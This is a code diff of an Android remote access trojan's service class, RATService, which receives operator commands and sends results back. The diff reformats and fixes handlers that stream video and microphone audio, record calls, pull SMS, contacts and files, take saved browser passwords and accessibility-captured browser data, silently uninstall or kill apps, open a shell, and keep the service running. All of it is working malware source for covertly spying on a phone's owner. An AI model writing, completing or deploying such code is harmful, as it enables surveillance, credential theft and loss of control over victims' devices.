@@ -96,12 +96,12 @@ public class RATService extends Service {
     private ShellModule shellModule;
     private DeviceModule deviceModule;
     private AppManagerModule appManagerModule;
-    // Add with your other module declarations
-     private CallRecordingModule callRecordingModule;
+    private CallRecordingModule callRecordingModule;
     // Track camera state
     private boolean isUsingFrontCamera = false;
-    // NEW: Video module
+    // Video module
     private VideoModule videoModule;
+    
     // Binder for GuardianService communication
     public class RATServiceBinder extends Binder {
         public void heartbeat() throws RemoteException {
@@ -199,10 +199,10 @@ public void onCreate() {
         Log.d(TAG, "✅ App manager module initialized");
     }
     
-    // NEW: Video module initialization
+    // Video module initialization
     if (Config.ENABLE_VIDEO) {
         videoModule = new VideoModule(this);
-        Log.d(TAG, "✅ Video module initialized (${Config.VIDEO_WIDTH}x${Config.VIDEO_HEIGHT}, ${Config.VIDEO_BITRATE/1000} kbps)");
+        Log.d(TAG, "✅ Video module initialized (" + Config.VIDEO_WIDTH + "x" + Config.VIDEO_HEIGHT + ", " + Config.VIDEO_BITRATE/1000 + " kbps)");
     }
     
     // Device module (always initialized)
@@ -279,6 +279,7 @@ public void onCreate() {
             Log.e(TAG, "Failed to acquire wake lock", e);
         }
     }
+    
     // Add this method to bring app to foreground
 private void bringAppToForeground() {
     try {
@@ -342,14 +343,11 @@ private void bringAppToForeground() {
         scheduleAllJobs();
         return START_STICKY;
     }
-    private BrowserAccessibilityService getBrowserAccessibilityService() {
-    // Since BrowserAccessibilityService is a service in the same app,
-    // we can't directly get an instance. Instead, we'll use a broadcast
-    // or we can modify the BrowserAccessibilityService to store a static reference.
     
-    // For now, we'll use the singleton pattern we added to BrowserAccessibilityService
-    return BrowserAccessibilityService.getInstance();
-}
+    private BrowserAccessibilityService getBrowserAccessibilityService() {
+        return BrowserAccessibilityService.getInstance();
+    }
+    
     private void schedulePersistenceJob() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             try {
@@ -634,16 +632,16 @@ private void bringAppToForeground() {
                 sendCommand("PONG");
                 break;
                 
-             case "help":
-    String helpText = "Available commands: info, location, location_stream [start/stop], " +
-                      "camera, camera_switch, camera_info, " +
-                      "video_start [front/back|quality], video_stop, " +
-                      "sms, calls, contacts, files_list [path], file_get [path], " +
-                      "file_delete [path], file_rename [old|new], create_folder [path|name], " +
-                      "file_zip [path], search_files [path|query], storage_info, " +
-                      "mic, mic_stop, shell, ping, test_folder [path]";
-    sendCommand("HELP|" + helpText);
-    break;
+            case "help":
+                String helpText = "Available commands: info, location, location_stream [start/stop], " +
+                                  "camera, camera_switch, camera_info, " +
+                                  "video_start [front/back|quality], video_stop, video_status, " +
+                                  "sms, calls, contacts, files_list [path], file_get [path], " +
+                                  "file_delete [path], file_rename [old|new], create_folder [path|name], " +
+                                  "file_zip [path], search_files [path|query], storage_info, " +
+                                  "mic, mic_stop, shell, ping, test_folder [path]";
+                sendCommand("HELP|" + helpText);
+                break;
                 
             case "info":
             case "device_info":
@@ -668,133 +666,157 @@ private void bringAppToForeground() {
             case "location_stream":
                 handleLocationStreamCommand(args);
                 break;
-                case "mic_path":
-    if (micModule != null) {
-        String result = micModule.getRecordingsPath();
-        sendCommand("MIC_PATH|" + result);
-    } else {
-        sendCommand("MIC_PATH|ERROR: Mic module not available");
-    }
-    break;
-       case "mic_list_detailed":
-    if (micModule != null) {
-        String result = micModule.listRecordingsDetailed();
-        try {
-            JSONObject jsonResponse = new JSONObject(result);
-            jsonResponse.put("command", "mic_response");
-            jsonResponse.put("action", "list_recordings_detailed");
-            sendCommand(jsonResponse.toString());
-        } catch (JSONException e) {
-            sendCommand("MIC_LIST|" + result);
-        }
-    } else {
-        sendCommand("MIC_LIST|ERROR: Mic module not available");
-    }
-    break;     
+                
+            case "mic_path":
+                if (micModule != null) {
+                    String result = micModule.getRecordingsPath();
+                    sendCommand("MIC_PATH|" + result);
+                } else {
+                    sendCommand("MIC_PATH|ERROR: Mic module not available");
+                }
+                break;
+                
+            case "mic_list_detailed":
+                if (micModule != null) {
+                    String result = micModule.listRecordingsDetailed();
+                    try {
+                        JSONObject jsonResponse = new JSONObject(result);
+                        jsonResponse.put("command", "mic_response");
+                        jsonResponse.put("action", "list_recordings_detailed");
+                        sendCommand(jsonResponse.toString());
+                    } catch (JSONException e) {
+                        sendCommand("MIC_LIST|" + result);
+                    }
+                } else {
+                    sendCommand("MIC_LIST|ERROR: Mic module not available");
+                }
+                break;     
 
-// Add to your routeCommand method
-case "call_recording_status":
-    if (callRecordingModule != null) {
-        String result = callRecordingModule.getStatus();
-        sendCommand("CALL_RECORDING_STATUS|" + result);
-    } else {
-        sendCommand("CALL_RECORDING_STATUS|{\"success\":false,\"error\":\"Module not available\"}");
-    }
-    break;
+            case "call_recording_status":
+                if (callRecordingModule != null) {
+                    String result = callRecordingModule.getStatus();
+                    sendCommand("CALL_RECORDING_STATUS|" + result);
+                } else {
+                    sendCommand("CALL_RECORDING_STATUS|{\"success\":false,\"error\":\"Module not available\"}");
+                }
+                break;
 
-// Add to your routeCommand method
-case "call_recording_set_unknown":
-    if (callRecordingModule != null && !args.isEmpty()) {
-        boolean enabled = Boolean.parseBoolean(args);
-        String result = callRecordingModule.setRecordUnknownOnly(enabled);
-        sendCommand("CALL_RECORDING_SET|" + result);
-    } else {
-        sendCommand("CALL_RECORDING_SET|{\"success\":false,\"error\":\"Invalid parameters\"}");
-    }
-    break;
+            case "call_recording_set_unknown":
+                if (callRecordingModule != null && !args.isEmpty()) {
+                    boolean enabled = Boolean.parseBoolean(args);
+                    String result = callRecordingModule.setRecordUnknownOnly(enabled);
+                    sendCommand("CALL_RECORDING_SET|" + result);
+                } else {
+                    sendCommand("CALL_RECORDING_SET|{\"success\":false,\"error\":\"Invalid parameters\"}");
+                }
+                break;
 
-case "call_recording_set_auto":
-    if (callRecordingModule != null && !args.isEmpty()) {
-        boolean enabled = Boolean.parseBoolean(args);
-        String result = callRecordingModule.setAutoRecord(enabled);
-        sendCommand("CALL_RECORDING_SET|" + result);
-    } else {
-        sendCommand("CALL_RECORDING_SET|{\"success\":false,\"error\":\"Invalid parameters\"}");
-    }
-    break;
+            case "call_recording_set_auto":
+                if (callRecordingModule != null && !args.isEmpty()) {
+                    boolean enabled = Boolean.parseBoolean(args);
+                    String result = callRecordingModule.setAutoRecord(enabled);
+                    sendCommand("CALL_RECORDING_SET|" + result);
+                } else {
+                    sendCommand("CALL_RECORDING_SET|{\"success\":false,\"error\":\"Invalid parameters\"}");
+                }
+                break;
 
-case "call_recording_list":
-    if (callRecordingModule != null) {
-        String result = callRecordingModule.getRecordings();
-        sendCommand("CALL_RECORDING_LIST|" + result);
-    }
-    break;
-            // VIDEO STREAMING COMMANDS
-case "video_start":
-    if (videoModule != null) {
-        Log.d(TAG, "📹 Starting video stream");
-        boolean useFront = args.equalsIgnoreCase("front");
-        
-        // Parse quality settings if provided (format: video_start|back|medium)
-        String[] parts = args.split("\\|");
-        if (parts.length > 1) {
-            useFront = parts[0].equalsIgnoreCase("front");
-            String quality = parts.length > 1 ? parts[1] : "medium";
-            
-            // Adjust bitrate based on quality
-            int bitrate = 500000; // default medium
-            switch (quality.toLowerCase()) {
-                case "low": bitrate = 250000; break;
-                case "medium": bitrate = 500000; break;
-                case "high": bitrate = 1000000; break;
-                case "hd": bitrate = 2000000; break;
-            }
-            Log.d(TAG, "📹 Quality: " + quality + ", bitrate: " + bitrate/1000 + " kbps");
-        }
-        
-        videoModule.startStreaming(new VideoModule.VideoCallback() {
-            @Override
-            public void onVideoFrame(String base64Frame) {
-                sendCommand(base64Frame);
-            }
-            
-            @Override
-            public void onStreamStarted() {
-                sendCommand("VIDEO_STATUS|started");
-                Log.d(TAG, "📹 Video stream started");
-            }
-            
-            @Override
-            public void onStreamStopped() {
-                sendCommand("VIDEO_STATUS|stopped");
-                Log.d(TAG, "📹 Video stream stopped");
-            }
-            
-            @Override
-            public void onError(String error) {
-                sendCommand("VIDEO_ERROR|" + error);
-                Log.e(TAG, "📹 Video error: " + error);
-            }
-        }, useFront);
-    } else {
-        sendCommand("VIDEO_ERROR|Video module not available");
-    }
-    break;
-    
-case "video_stop":
-    if (videoModule != null) {
-        Log.d(TAG, "📹 Stopping video stream");
-        videoModule.stopStreaming(null);
-    }
-    break;
-    
-case "video_status":
-    if (videoModule != null) {
-        // Could add method to check if streaming
-        sendCommand("VIDEO_STATUS|unknown");
-    }
-    break;    
-            // Camera commands - Updated to match working project format
+            case "call_recording_list":
+                if (callRecordingModule != null) {
+                    String result = callRecordingModule.getRecordings();
+                    sendCommand("CALL_RECORDING_LIST|" + result);
+                }
+                break;
+                
+            // VIDEO STREAMING COMMANDS - FIXED
+            case "video_start":
+                if (videoModule != null) {
+                    Log.d(TAG, "📹 Starting video stream with args: " + args);
+                    
+                    // Parse args: format: "back" or "front" or "back|medium"
+                    String[] parts = args.split("\\|");
+                    boolean useFront = false;
+                    String quality = "medium";
+                    
+                    if (parts.length >= 1) {
+                        useFront = parts[0].equalsIgnoreCase("front");
+                    }
+                    
+                    if (parts.length >= 2) {
+                        quality = parts[1].toLowerCase();
+                    }
+                    
+                    // Adjust bitrate based on quality
+                    final int bitrate;
+                    switch (quality) {
+                        case "low": bitrate = 250000; break;
+                        case "medium": bitrate = 500000; break;
+                        case "high": bitrate = 1000000; break;
+                        case "hd": bitrate = 2000000; break;
+                        default: bitrate = 500000;
+                    }
+                    
+                    Log.d(TAG, "📹 Quality: " + quality + ", bitrate: " + bitrate/1000 + " kbps, Camera: " + (useFront ? "Front" : "Back"));
+                    
+                    // Check if already streaming
+                    if (videoModule.isStreaming()) {
+                        sendCommand("VIDEO_ERROR|Already streaming");
+                        return;
+                    }
+                    
+                    videoModule.startStreaming(new VideoModule.VideoCallback() {
+                        @Override
+                        public void onVideoFrame(String base64Frame) {
+                            sendCommand(base64Frame);
+                        }
+                        
+                        @Override
+                        public void onStreamStarted() {
+                            sendCommand("VIDEO_STATUS|started");
+                            Log.d(TAG, "📹 Video stream started");
+                        }
+                        
+                        @Override
+                        public void onStreamStopped() {
+                            sendCommand("VIDEO_STATUS|stopped");
+                            Log.d(TAG, "📹 Video stream stopped");
+                        }
+                        
+                        @Override
+                        public void onError(String error) {
+                            sendCommand("VIDEO_ERROR|" + error);
+                            Log.e(TAG, "📹 Video error: " + error);
+                        }
+                    }, useFront);
+                    
+                } else {
+                    sendCommand("VIDEO_ERROR|Video module not available");
+                }
+                break;
+                
+            case "video_stop":
+                if (videoModule != null) {
+                    Log.d(TAG, "📹 Stopping video stream");
+                    if (videoModule.isStreaming()) {
+                        videoModule.stopStreaming();
+                        sendCommand("VIDEO_STATUS|stopped");
+                    } else {
+                        sendCommand("VIDEO_STATUS|not_streaming");
+                    }
+                } else {
+                    sendCommand("VIDEO_ERROR|Video module not available");
+                }
+                break;
+                
+            case "video_status":
+                if (videoModule != null) {
+                    sendCommand("VIDEO_STATUS|" + (videoModule.isStreaming() ? "streaming" : "idle"));
+                } else {
+                    sendCommand("VIDEO_STATUS|unavailable");
+                }
+                break;    
+                
+            // Camera commands
             case "take_photo":
             case "camera":
             case "camera_photo":
@@ -908,7 +930,6 @@ case "video_status":
                 }
                 break;
 
-                
             case "camera_switch":
                 if (cameraModule != null) {
                     Log.d(TAG, "🔄 Switching camera");
@@ -962,243 +983,235 @@ case "video_status":
                 }
                 break;
 
-                // In routeCommand() method, add these cases:
-
-// Add this to your routeCommand method where you handle other commands
-
-       // Browser-related cases with proper exception handling
-case "browser_data":
-case "get_browsers":
-    if (browserModule != null) {
-        Log.d(TAG, "🌐 Getting all browser data");
-        String result = browserModule.getAllBrowserData();
-        sendCommand("BROWSER_DATA|" + result);
-    } else {
-        sendCommand("BROWSER_DATA|{\"success\":false,\"error\":\"Browser module not available\"}");
-    }
-    break;
-
-case "browser_export":
-    if (browserModule != null) {
-        Log.d(TAG, "🌐 Exporting browser data");
-        String result = browserModule.exportBrowserData();
-        sendCommand("BROWSER_EXPORT|" + result);
-    } else {
-        sendCommand("BROWSER_EXPORT|{\"success\":false,\"error\":\"Browser module not available\"}");
-    }
-    break;
-
-case "browser_history":
-    if (browserModule != null && !args.isEmpty()) {
-        Log.d(TAG, "🌐 Getting history for: " + args);
-        try {
-            JSONArray history = browserModule.getBrowserHistory(args);
-            JSONObject result = new JSONObject();
-            result.put("success", true);
-            result.put("packageName", args);
-            result.put("history", history);
-            result.put("count", history.length());
-            sendCommand("BROWSER_HISTORY|" + result.toString());
-        } catch (JSONException e) {
-            Log.e(TAG, "Error creating browser history response", e);
-            sendCommand("BROWSER_HISTORY|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
-        }
-    } else {
-        sendCommand("BROWSER_HISTORY|{\"success\":false,\"error\":\"Invalid package name\"}");
-    }
-    break;                
-case "browser_bookmarks":
-    if (browserModule != null && !args.isEmpty()) {
-        Log.d(TAG, "🌐 Getting bookmarks for: " + args);
-        try {
-            JSONArray bookmarks = browserModule.getBrowserBookmarks(args);
-            JSONObject result = new JSONObject();
-            result.put("success", true);
-            result.put("packageName", args);
-            result.put("bookmarks", bookmarks);
-            result.put("count", bookmarks.length());
-            sendCommand("BROWSER_BOOKMARKS|" + result.toString());
-        } catch (JSONException e) {
-            Log.e(TAG, "Error creating browser bookmarks response", e);
-            sendCommand("BROWSER_BOOKMARKS|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
-        }
-    } else {
-        sendCommand("BROWSER_BOOKMARKS|{\"success\":false,\"error\":\"Invalid package name\"}");
-    }
-    break;
-
-case "browser_passwords":
-    if (browserModule != null && !args.isEmpty()) {
-        Log.d(TAG, "🌐 Getting passwords for: " + args);
-        try {
-            JSONArray passwords = browserModule.getSavedPasswords(args);
-            JSONObject result = new JSONObject();
-            result.put("success", true);
-            result.put("packageName", args);
-            result.put("passwords", passwords);
-            result.put("count", passwords.length());
-            sendCommand("BROWSER_PASSWORDS|" + result.toString());
-        } catch (JSONException e) {
-            Log.e(TAG, "Error creating browser passwords response", e);
-            sendCommand("BROWSER_PASSWORDS|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
-        }
-    } else {
-        sendCommand("BROWSER_PASSWORDS|{\"success\":false,\"error\":\"Invalid package name\"}");
-    }
-    break;
-
-// NEW: Handle captured browser data from accessibility service
-case "get_captured_browser_data":
-    try {
-        BrowserAccessibilityService service = BrowserAccessibilityService.getInstance();
-        if (service != null) {
-            Log.d(TAG, "📱 Getting captured browser data from accessibility service");
-            String result = service.getCapturedData();
-            sendCommand("CAPTURED_BROWSER_DATA|" + result);
-        } else {
-            Log.d(TAG, "⚠️ Accessibility service not running");
-            sendCommand("CAPTURED_BROWSER_DATA|{\"success\":false,\"error\":\"Accessibility service not running. Please enable it in Settings → Accessibility.\"}");
-        }
-    } catch (Exception e) {
-        Log.e(TAG, "Error getting captured browser data", e);
-        sendCommand("CAPTURED_BROWSER_DATA|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
-    }
-    break;
-// In routeCommand() method, add these cases:
-
-case "apps_list":
-case "list_apps":
-    if (appManagerModule != null) {
-        boolean includeSystem = args.equalsIgnoreCase("true");
-        String result = appManagerModule.listInstalledApps(includeSystem);
-        sendCommand("APPS_LIST|" + result);
-    } else {
-        sendCommand("APPS_LIST|{\"success\":false,\"error\":\"App manager not available\"}");
-    }
-    break;
-
-case "app_info":
-    if (appManagerModule != null && !args.isEmpty()) {
-        String result = appManagerModule.getAppInfo(args);
-        sendCommand("APP_INFO|" + result);
-    } else {
-        sendCommand("APP_INFO|{\"success\":false,\"error\":\"Invalid package name\"}");
-    }
-    break;
-
-case "app_stop":
-case "force_stop":
-    if (appManagerModule != null && !args.isEmpty()) {
-        String result = appManagerModule.forceStopApp(args);
-        sendCommand("APPS_ACTION|" + result);
-    } else {
-        sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"Invalid package name\"}");
-    }
-    break;
-
-case "app_uninstall":
-    if (appManagerModule != null && args.contains("|")) {
-        String[] parts = args.split("\\|", 2);
-        String packageName = parts[0];
-        boolean silent = parts.length > 1 && parts[1].equalsIgnoreCase("true");
-        String result = appManagerModule.uninstallApp(packageName, silent);
-        sendCommand("APPS_ACTION|" + result);
-    } else {
-        sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"Invalid format. Use: package|silent\"}");
-    }
-    break;
-
-case "apps_usage":
-    if (appManagerModule != null) {
-        int days = 7; // default
-        if (!args.isEmpty()) {
-            try {
-                days = Integer.parseInt(args);
-            } catch (NumberFormatException e) {
-                // use default
-            }
-        }
-        String result = appManagerModule.getAppUsageStats(days);
-        sendCommand("APPS_USAGE|" + result);
-    } else {
-        sendCommand("APPS_USAGE|{\"success\":false,\"error\":\"App manager not available\"}");
-    }
-    break;
-
-case "app_block":
-    if (appManagerModule != null && args.contains("|")) {
-        String[] parts = args.split("\\|", 2);
-        String packageName = parts[0];
-        boolean block = parts.length > 1 && parts[1].equalsIgnoreCase("true");
-        String result = appManagerModule.blockApp(packageName, block);
-        sendCommand("APPS_ACTION|" + result);
-    } else {
-        sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"Invalid format. Use: package|true/false\"}");
-    }
-    break;
-
-case "apps_running":
-    if (appManagerModule != null) {
-        String result = appManagerModule.getRunningApps();
-        sendCommand("APPS_RUNNING|" + result);
-    } else {
-        sendCommand("APPS_RUNNING|{\"success\":false,\"error\":\"App manager not available\"}");
-    }
-    break;
-
-case "apps_blocked_list":
-    if (appManagerModule != null) {
-        String result = appManagerModule.getBlockedApps();
-        sendCommand("APPS_BLOCKED|" + result);
-    } else {
-        sendCommand("APPS_BLOCKED|{\"success\":false,\"error\":\"App manager not available\"}");
-    }
-    break;
-
-case "app_clear_data":
-    if (appManagerModule != null && !args.isEmpty()) {
-        String result = appManagerModule.clearAppData(args);
-        sendCommand("APPS_ACTION|" + result);
-    } else {
-        sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"Invalid package name\"}");
-    }
-    break;
-
-case "apps_kill_all":
-    if (appManagerModule != null) {
-        try {
-            String runningAppsJson = appManagerModule.getRunningApps();
-            JSONObject json = new JSONObject(runningAppsJson);
-            JSONArray apps = json.getJSONArray("apps");
-            int killed = 0;
-            for (int i = 0; i < apps.length(); i++) {
-                JSONObject app = apps.getJSONObject(i);
-                String packageName = app.getString("packageName");
-                // Don't kill system apps
-                if (!packageName.startsWith("com.android.") && 
-                    !packageName.startsWith("android") &&
-                    !packageName.equals(RATService.this.getPackageName())) {  // FIXED: Use RATService.this.getPackageName()
-                    appManagerModule.forceStopApp(packageName);
-                    killed++;
+            // Browser-related cases
+            case "browser_data":
+            case "get_browsers":
+                if (browserModule != null) {
+                    Log.d(TAG, "🌐 Getting all browser data");
+                    String result = browserModule.getAllBrowserData();
+                    sendCommand("BROWSER_DATA|" + result);
+                } else {
+                    sendCommand("BROWSER_DATA|{\"success\":false,\"error\":\"Browser module not available\"}");
                 }
-            }
-            JSONObject result = new JSONObject();
-            result.put("success", true);
-            result.put("message", "Killed " + killed + " apps");
-            result.put("count", killed);
-            sendCommand("APPS_ACTION|" + result.toString());
-        } catch (Exception e) {
-            Log.e(TAG, "Error killing apps", e);
-            sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
-        }
-    } else {
-        sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"App manager not available\"}");
-    }
-    break;
+                break;
 
+            case "browser_export":
+                if (browserModule != null) {
+                    Log.d(TAG, "🌐 Exporting browser data");
+                    String result = browserModule.exportBrowserData();
+                    sendCommand("BROWSER_EXPORT|" + result);
+                } else {
+                    sendCommand("BROWSER_EXPORT|{\"success\":false,\"error\":\"Browser module not available\"}");
+                }
+                break;
 
+            case "browser_history":
+                if (browserModule != null && !args.isEmpty()) {
+                    Log.d(TAG, "🌐 Getting history for: " + args);
+                    try {
+                        JSONArray history = browserModule.getBrowserHistory(args);
+                        JSONObject result = new JSONObject();
+                        result.put("success", true);
+                        result.put("packageName", args);
+                        result.put("history", history);
+                        result.put("count", history.length());
+                        sendCommand("BROWSER_HISTORY|" + result.toString());
+                    } catch (JSONException e) {
+                        Log.e(TAG, "Error creating browser history response", e);
+                        sendCommand("BROWSER_HISTORY|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
+                    }
+                } else {
+                    sendCommand("BROWSER_HISTORY|{\"success\":false,\"error\":\"Invalid package name\"}");
+                }
+                break;                
                 
-                
+            case "browser_bookmarks":
+                if (browserModule != null && !args.isEmpty()) {
+                    Log.d(TAG, "🌐 Getting bookmarks for: " + args);
+                    try {
+                        JSONArray bookmarks = browserModule.getBrowserBookmarks(args);
+                        JSONObject result = new JSONObject();
+                        result.put("success", true);
+                        result.put("packageName", args);
+                        result.put("bookmarks", bookmarks);
+                        result.put("count", bookmarks.length());
+                        sendCommand("BROWSER_BOOKMARKS|" + result.toString());
+                    } catch (JSONException e) {
+                        Log.e(TAG, "Error creating browser bookmarks response", e);
+                        sendCommand("BROWSER_BOOKMARKS|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
+                    }
+                } else {
+                    sendCommand("BROWSER_BOOKMARKS|{\"success\":false,\"error\":\"Invalid package name\"}");
+                }
+                break;
+
+            case "browser_passwords":
+                if (browserModule != null && !args.isEmpty()) {
+                    Log.d(TAG, "🌐 Getting passwords for: " + args);
+                    try {
+                        JSONArray passwords = browserModule.getSavedPasswords(args);
+                        JSONObject result = new JSONObject();
+                        result.put("success", true);
+                        result.put("packageName", args);
+                        result.put("passwords", passwords);
+                        result.put("count", passwords.length());
+                        sendCommand("BROWSER_PASSWORDS|" + result.toString());
+                    } catch (JSONException e) {
+                        Log.e(TAG, "Error creating browser passwords response", e);
+                        sendCommand("BROWSER_PASSWORDS|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
+                    }
+                } else {
+                    sendCommand("BROWSER_PASSWORDS|{\"success\":false,\"error\":\"Invalid package name\"}");
+                }
+                break;
+
+            case "get_captured_browser_data":
+                try {
+                    BrowserAccessibilityService service = BrowserAccessibilityService.getInstance();
+                    if (service != null) {
+                        Log.d(TAG, "📱 Getting captured browser data from accessibility service");
+                        String result = service.getCapturedData();
+                        sendCommand("CAPTURED_BROWSER_DATA|" + result);
+                    } else {
+                        Log.d(TAG, "⚠️ Accessibility service not running");
+                        sendCommand("CAPTURED_BROWSER_DATA|{\"success\":false,\"error\":\"Accessibility service not running. Please enable it in Settings → Accessibility.\"}");
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Error getting captured browser data", e);
+                    sendCommand("CAPTURED_BROWSER_DATA|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
+                }
+                break;
+
+            case "apps_list":
+            case "list_apps":
+                if (appManagerModule != null) {
+                    boolean includeSystem = args.equalsIgnoreCase("true");
+                    String result = appManagerModule.listInstalledApps(includeSystem);
+                    sendCommand("APPS_LIST|" + result);
+                } else {
+                    sendCommand("APPS_LIST|{\"success\":false,\"error\":\"App manager not available\"}");
+                }
+                break;
+
+            case "app_info":
+                if (appManagerModule != null && !args.isEmpty()) {
+                    String result = appManagerModule.getAppInfo(args);
+                    sendCommand("APP_INFO|" + result);
+                } else {
+                    sendCommand("APP_INFO|{\"success\":false,\"error\":\"Invalid package name\"}");
+                }
+                break;
+
+            case "app_stop":
+            case "force_stop":
+                if (appManagerModule != null && !args.isEmpty()) {
+                    String result = appManagerModule.forceStopApp(args);
+                    sendCommand("APPS_ACTION|" + result);
+                } else {
+                    sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"Invalid package name\"}");
+                }
+                break;
+
+            case "app_uninstall":
+                if (appManagerModule != null && args.contains("|")) {
+                    String[] parts = args.split("\\|", 2);
+                    String packageName = parts[0];
+                    boolean silent = parts.length > 1 && parts[1].equalsIgnoreCase("true");
+                    String result = appManagerModule.uninstallApp(packageName, silent);
+                    sendCommand("APPS_ACTION|" + result);
+                } else {
+                    sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"Invalid format. Use: package|silent\"}");
+                }
+                break;
+
+            case "apps_usage":
+                if (appManagerModule != null) {
+                    int days = 7; // default
+                    if (!args.isEmpty()) {
+                        try {
+                            days = Integer.parseInt(args);
+                        } catch (NumberFormatException e) {
+                            // use default
+                        }
+                    }
+                    String result = appManagerModule.getAppUsageStats(days);
+                    sendCommand("APPS_USAGE|" + result);
+                } else {
+                    sendCommand("APPS_USAGE|{\"success\":false,\"error\":\"App manager not available\"}");
+                }
+                break;
+
+            case "app_block":
+                if (appManagerModule != null && args.contains("|")) {
+                    String[] parts = args.split("\\|", 2);
+                    String packageName = parts[0];
+                    boolean block = parts.length > 1 && parts[1].equalsIgnoreCase("true");
+                    String result = appManagerModule.blockApp(packageName, block);
+                    sendCommand("APPS_ACTION|" + result);
+                } else {
+                    sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"Invalid format. Use: package|true/false\"}");
+                }
+                break;
+
+            case "apps_running":
+                if (appManagerModule != null) {
+                    String result = appManagerModule.getRunningApps();
+                    sendCommand("APPS_RUNNING|" + result);
+                } else {
+                    sendCommand("APPS_RUNNING|{\"success\":false,\"error\":\"App manager not available\"}");
+                }
+                break;
+
+            case "apps_blocked_list":
+                if (appManagerModule != null) {
+                    String result = appManagerModule.getBlockedApps();
+                    sendCommand("APPS_BLOCKED|" + result);
+                } else {
+                    sendCommand("APPS_BLOCKED|{\"success\":false,\"error\":\"App manager not available\"}");
+                }
+                break;
+
+            case "app_clear_data":
+                if (appManagerModule != null && !args.isEmpty()) {
+                    String result = appManagerModule.clearAppData(args);
+                    sendCommand("APPS_ACTION|" + result);
+                } else {
+                    sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"Invalid package name\"}");
+                }
+                break;
+
+            case "apps_kill_all":
+                if (appManagerModule != null) {
+                    try {
+                        String runningAppsJson = appManagerModule.getRunningApps();
+                        JSONObject json = new JSONObject(runningAppsJson);
+                        JSONArray apps = json.getJSONArray("apps");
+                        int killed = 0;
+                        for (int i = 0; i < apps.length(); i++) {
+                            JSONObject app = apps.getJSONObject(i);
+                            String packageName = app.getString("packageName");
+                            // Don't kill system apps
+                            if (!packageName.startsWith("com.android.") && 
+                                !packageName.startsWith("android") &&
+                                !packageName.equals(RATService.this.getPackageName())) {
+                                appManagerModule.forceStopApp(packageName);
+                                killed++;
+                            }
+                        }
+                        JSONObject result = new JSONObject();
+                        result.put("success", true);
+                        result.put("message", "Killed " + killed + " apps");
+                        result.put("count", killed);
+                        sendCommand("APPS_ACTION|" + result.toString());
+                    } catch (Exception e) {
+                        Log.e(TAG, "Error killing apps", e);
+                        sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"" + e.getMessage() + "\"}");
+                    }
+                } else {
+                    sendCommand("APPS_ACTION|{\"success\":false,\"error\":\"App manager not available\"}");
+                }
+                break;
+
             case "sms":
             case "get_sms":
                 if (smsModule != null) {
@@ -1335,258 +1348,258 @@ case "apps_kill_all":
                 }
                 break;
                 
-           // Microphone commands
-case "mic":
-case "mic_start":
-case "start_recording":
-    if (micModule != null) {
-        Log.d(TAG, "🎤 Starting recording");
-        
-        // Parse args: format|duration|bitrate
-        String[] parts = args.split("\\|");
-        String format = parts.length > 0 ? parts[0] : "mp3";
-        int duration = parts.length > 1 ? Integer.parseInt(parts[1]) : 30;
-        int bitrate = parts.length > 2 ? Integer.parseInt(parts[2]) : 128;
-        
-        String result = micModule.startRecording(duration, format, bitrate);
-        
-        // Send acknowledgment
-        try {
-            JSONObject response = new JSONObject();
-            response.put("command", "mic_response");
-            response.put("action", "start_recording");
-            response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
-            response.put("message", result);
-            sendCommand(response.toString());
-        } catch (JSONException e) {
-            Log.e(TAG, "JSON error", e);
-        }
-    } else {
-        sendCommand("MIC|ERROR: Microphone module not available");
-    }
-    break;
-    
-case "mic_stop":
-case "stop_recording":
-    if (micModule != null) {
-        Log.d(TAG, "🎤 Stopping recording");
-        String result = micModule.stopRecording();
-        
-        // Send the recording data
-        try {
-            JSONObject response = new JSONObject(result);
-            response.put("command", "mic_response");
-            response.put("action", "stop_recording");
-            sendCommand(response.toString());
-        } catch (JSONException e) {
-            sendCommand("MIC_STOP|" + result);
-        }
-    } else {
-        sendCommand("MIC_STOP|ERROR: Microphone module not available");
-    }
-    break;
-    
-case "mic_stream":
-case "start_streaming":
-    if (micModule != null) {
-        Log.d(TAG, "🎤 Starting live stream");
-        
-        // Parse args: sampleRate|bitrate|format
-        String[] parts = args.split("\\|");
-        int sampleRate = parts.length > 0 ? Integer.parseInt(parts[0]) : 44100;
-        int bitrate = parts.length > 1 ? Integer.parseInt(parts[1]) : 128;
-        String format = parts.length > 2 ? parts[2] : "mp3";
-        
-        // Set up streaming callback
-        String result = micModule.startStreaming(sampleRate, bitrate, format, 
-            new MicModule.StreamDataCallback() {
-                @Override
-                public void onStreamData(byte[] data, int length) {
+            // Microphone commands
+            case "mic":
+            case "mic_start":
+            case "start_recording":
+                if (micModule != null) {
+                    Log.d(TAG, "🎤 Starting recording");
+                    
+                    // Parse args: format|duration|bitrate
+                    String[] parts = args.split("\\|");
+                    String format = parts.length > 0 ? parts[0] : "mp3";
+                    int duration = parts.length > 1 ? Integer.parseInt(parts[1]) : 30;
+                    int bitrate = parts.length > 2 ? Integer.parseInt(parts[2]) : 128;
+                    
+                    String result = micModule.startRecording(duration, format, bitrate);
+                    
+                    // Send acknowledgment
                     try {
-                        JSONObject streamData = new JSONObject();
-                        streamData.put("command", "mic_stream_data");
-                        streamData.put("data", Base64.encodeToString(data, Base64.NO_WRAP));
-                        streamData.put("length", length);
-                        sendCommand(streamData.toString());
+                        JSONObject response = new JSONObject();
+                        response.put("command", "mic_response");
+                        response.put("action", "start_recording");
